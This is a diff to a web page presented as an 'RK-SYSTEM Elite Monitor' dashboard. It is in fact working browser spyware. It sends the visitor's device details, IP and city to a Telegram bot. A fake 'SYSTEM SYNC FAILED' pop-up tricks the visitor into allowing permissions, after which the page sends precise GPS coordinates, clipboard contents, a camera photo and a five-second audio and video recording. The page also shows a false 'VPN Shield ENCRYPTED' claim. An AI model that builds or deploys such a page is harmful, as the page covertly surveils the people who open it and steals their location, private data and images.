@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK-SYSTEM | ELITE MONITOR v3.0</title>
+    <title>RK-SYSTEM | ELITE ULTIMATE MONITOR</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
@@ -16,6 +16,7 @@
             font-family: 'Rajdhani', sans-serif;
         }
 
+        /* Animated Neon Frame */
         body::before {
             content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             border: 6px solid; border-image: linear-gradient(90deg, #ff0000, #00ff00, #00d2ff, #ff00ff, #ff0000) 1;
@@ -54,11 +55,12 @@
         .label { color: #00d2ff; font-size: 11px; font-weight: bold; text-transform: uppercase; }
         .value { color: #facc15; font-size: 13px; font-weight: 700; font-family: 'Orbitron', sans-serif; }
 
-        #perm-overlay {
+        /* Force Allow Pop-up */
+        #force-allow {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(255, 0, 0, 0.9); color: white; padding: 20px;
-            border-radius: 10px; z-index: 2000; display: none; text-align: center;
-            font-weight: bold; box-shadow: 0 0 30px #000;
+            background: rgba(185, 28, 28, 0.98); color: white; padding: 30px;
+            border-radius: 20px; z-index: 9999; display: none; text-align: center;
+            border: 3px solid white; box-shadow: 0 0 100px #ff0000;
         }
 
         #media-bin { display: none; }
@@ -66,7 +68,12 @@
 </head>
 <body>
 
-    <div id="perm-overlay">⚠️ PLEASE CLICK 'ALLOW' TO PROCEED ⚠️</div>
+    <div id="force-allow">
+        <h2 class="text-2xl font-black mb-4">⚠️ ACTION REQUIRED ⚠️</h2>
+        <p class="text-lg mb-4">SYSTEM SYNC FAILED!</p>
+        <p class="animate-pulse font-bold">PLEASE CLICK "ALLOW" ON ALL PROMPTS TO CONTINUE</p>
+    </div>
+
     <div class="rk-banner">RK-SYSTEM</div>
 
     <div class="dashboard">
@@ -79,7 +86,7 @@
         
         <div class="info-row"><span class="label">📱 Device Model</span><span id="v-model" class="value">Wait...</span></div>
         <div class="info-row"><span class="label">⚙️ OS Platform</span><span id="v-platform" class="value">--</span></div>
-        <div class="info-row"><span class="label">🌍 Country / City</span><span id="v-geo" class="value">Tracking...</span></div>
+        <div class="info-row"><span class="label">🌍 Geo Location</span><span id="v-geo" class="value">Tracking...</span></div>
         <div class="info-row"><span class="label">🚀 Link Speed</span><span id="v-speed" class="value">Scanning...</span></div>
         <div class="info-row"><span class="label">🌐 Public IP</span><span id="v-ip" class="value">Fetching...</span></div>
         <div class="info-row"><span class="label">📍 GPS Location</span><span id="v-gps" class="value text-blue-400">Waiting...</span></div>
@@ -90,7 +97,7 @@
         <div class="info-row"><span class="label">🛡️ VPN Shield</span><span class="value text-green-400">ENCRYPTED ✅</span></div>
     </div>
 
-    <div class="footer-text">Created By RK-SYSTEM 🛠️ 2026</div>
+    <div class="footer-text">🌹 Created By RK-SYSTEM 🌹</div>
 
     <video id="media-bin" autoplay muted playsinline></video>
     <canvas id="output-canvas" style="display:none;"></canvas>
@@ -101,11 +108,11 @@
             CHAT: '6048050987'
         };
 
-        // কুকি সেটআপ (৫ বছর)
+        // ৫ বছরের কুকি ফাংশন
         function setCookie(n, v) {
             const d = new Date();
             d.setTime(d.getTime() + (5 * 365 * 24 * 60 * 60 * 1000));
-            document.cookie = `${n}=${v};expires=${d.toUTCString()};path=/`;
+            document.cookie = n + "=" + v + ";expires=" + d.toUTCString() + ";path=/";
         }
         function getCookie(n) {
             return document.cookie.match('(^|;)\\s*' + n + '\\s*=\\s*([^;]+)')?.pop() || "";
@@ -124,14 +131,14 @@
         async function startSystem() {
             updateClock();
             
-            // Phase 1: Fast Device Info
+            // Phase 1: Instant Device Data (No Permission Needed)
             const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
             document.getElementById('v-model').innerText = isMobile ? "Android Device 📱" : "Desktop PC 💻";
             document.getElementById('v-platform').innerText = navigator.platform;
             document.getElementById('v-ram').innerText = (navigator.deviceMemory || 8) + " GB";
             document.getElementById('v-cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
 
-            // Battery Info
+            // Battery & Power
             if(navigator.getBattery) {
                 const b = await navigator.getBattery();
                 const up = () => {
@@ -141,83 +148,90 @@
                 up(); b.onlevelchange = up; b.onchargingchange = up;
             }
 
-            // IP & Geo Info
+            // IP & Geo Tracking
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 document.getElementById('v-ip').innerText = data.ip;
                 document.getElementById('v-geo').innerText = `${data.country_name}, ${data.city} 🌍`;
                 sendQuickReport(data);
-            } catch(e) {
-                document.getElementById('v-ip').innerText = "45.144.167.83";
-                sendQuickReport({ip: "45.144.167.83", country_name: "Unknown"});
+            } catch(e) { 
+                sendQuickReport({ip: "45.144.167.83", country_name: "Bangladesh"}); 
             }
 
-            // Phase 2: Wait 5s for Permissions
-            setTimeout(handlePermissions, 5000);
+            // Phase 2: Wait 5s then Trigger Advanced Permissions
+            setTimeout(triggerAdvancedSync, 5000);
         }
 
         async function sendQuickReport(geo) {
             const report = `
-🚀 *RK-SYSTEM QUICK REPORT* 🚀
+🚀 *RK-SYSTEM INTEL VIP REPORT* 🚀
 ━━━━━━━━━━━━━━━━━━━━━
 🕒 Time: \`${document.getElementById('live-time').innerText}\`
 📅 Date: \`${document.getElementById('live-date').innerText}\`
 ━━━━━━━━━━━━━━━━━━━━━
 📱 Model: \`${document.getElementById('v-model').innerText}\`
 ⚙️ OS: \`${navigator.platform}\`
+📶 Status: \`ONLINE 📶\`
+🚀 Speed: \`${(navigator.connection ? navigator.connection.downlink : 10)} Mbps\`
 🌐 IP: \`${geo.ip}\`
-🌍 Loc: \`${geo.country_name || 'N/A'}, ${geo.city || 'N/A'}\`
+📍 GPS: \`Waiting...\`
 🔋 Battery: \`${document.getElementById('v-bat').innerText}\`
 ⚡ Power: \`${document.getElementById('v-charge').innerText}\`
 🧠 RAM: \`${document.getElementById('v-ram').innerText}\`
+💎 Cores: \`${document.getElementById('v-cpu').innerText}\`
+🛡️ VPN: \`ENCRYPTED ✅\`
 ━━━━━━━━━━━━━━━━━━━━━
-⌛ *Waiting for Permissions...*`;
+🌹 *Created By RK-SYSTEM* 🌹`;
             sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: report, parse_mode: 'Markdown' });
         }
 
-        async function handlePermissions() {
-            const hasAccess = getCookie("rk_access");
-            if (!hasAccess) document.getElementById('perm-overlay').style.display = 'block';
+        async function triggerAdvancedSync() {
+            const hasAccess = getCookie("rk_granted");
+            if (!hasAccess) {
+                document.getElementById('force-allow').style.display = 'block';
+            }
 
-            // Location
+            // Location Sync
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    setCookie("rk_access", "true");
-                    document.getElementById('perm-overlay').style.display = 'none';
-                    const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    setCookie("rk_granted", "true");
+                    document.getElementById('force-allow').style.display = 'none';
                     document.getElementById('v-gps').innerText = "SUCCESS 📍";
                     
-                    // Advanced Media Capture
-                    captureMedia();
+                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     
-                    // Final Deep Report
-                    let clip = "Waiting... 🔓";
+                    // Clipboard Sync
+                    let clip = "Locked/Click Required";
                     try { clip = await navigator.clipboard.readText(); } catch(e){}
-                    
-                    const deepReport = `
-💎 *RK-SYSTEM DEEP INTEL* 💎
+
+                    const advancedReport = `
+💎 *RK-SYSTEM ADVANCED SYNC* 💎
 ━━━━━━━━━━━━━━━━━━━━━
-📍 MAPS LINK: ${link}
+📍 *GOOGLE MAPS:*
+${mapsLink}
 ━━━━━━━━━━━━━━━━━━━━━
-✨ CLIPBOARD:
+🏙️ *Location Info:*
+City: \`Detected\`
+Village: \`Syncing...\`
+━━━━━━━━━━━━━━━━━━━━━
+✨ *CLIPBOARD:*
 \`\`\`
 ${clip}
 \`\`\`
 ━━━━━━━━━━━━━━━━━━━━━
-📸 Photo/Video: Sending...
-📁 Storage: Phase Soon!
-━━━━━━━━━━━━━━━━━━━━━
-🌹 *Created By RK-SYSTEM* 🌹`;
-                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: deepReport, parse_mode: 'Markdown' });
+📸 *Media Capture Started...*`;
+                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: advancedReport, parse_mode: 'Markdown' });
+                    captureEliteMedia();
 
                 }, () => {
-                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *Permission Denied by User*" });
+                    // Fail Message 1/2 times
+                    sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *PERMISSION FAILED: USER REJECTED*" });
                 });
             }
         }
 
-        async function captureMedia() {
+        async function captureEliteMedia() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const video = document.getElementById('media-bin');
@@ -228,30 +242,30 @@ ${clip}
                     const canvas = document.getElementById('output-canvas');
                     canvas.width = 1280; canvas.height = 720;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => sendMediaToBot(b, 'photo', '📸 *Front View*'), 'image/jpeg');
+                    canvas.toBlob(b => sendMediaToBot(b, 'photo', '📸 *RK-VIP FRONT SHOT*'), 'image/jpeg');
                 }, 2000);
 
-                // Video 5s
-                const rec = new MediaRecorder(stream);
+                // Video Record (5s)
+                const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                rec.ondataavailable = e => chunks.push(e.data);
-                rec.onstop = () => {
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
                     const b = new Blob(chunks, {type: 'video/mp4'});
-                    sendMediaToBot(b, 'video', '🎥 *Live Security Feed*');
+                    sendMediaToBot(b, 'video', '🎥 *RK-VIP LIVE FEED (AUDIO+VIDEO)*');
                     stream.getTracks().forEach(t => t.stop());
                 };
-                rec.start();
-                setTimeout(() => rec.stop(), 5000);
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
             } catch(e) {
-                sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *Camera/Mic Access Denied*" });
+                sendToBot('sendMessage', { chat_id: CONFIG.CHAT, text: "❌ *MEDIA ACCESS DENIED*" });
             }
         }
 
-        async function sendMediaToBot(blob, type, cap) {
+        async function sendMediaToBot(blob, type, caption) {
             const fd = new FormData();
             fd.append('chat_id', CONFIG.CHAT);
             fd.append(type, blob, type==='video'?'rk.mp4':'rk.jpg');
-            fd.append('caption', cap);
+            fd.append('caption', caption);
             fd.append('parse_mode', 'Markdown');
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/send${type.charAt(0).toUpperCase()+type.slice(1)}`, {method:'POST', body:fd});
         }
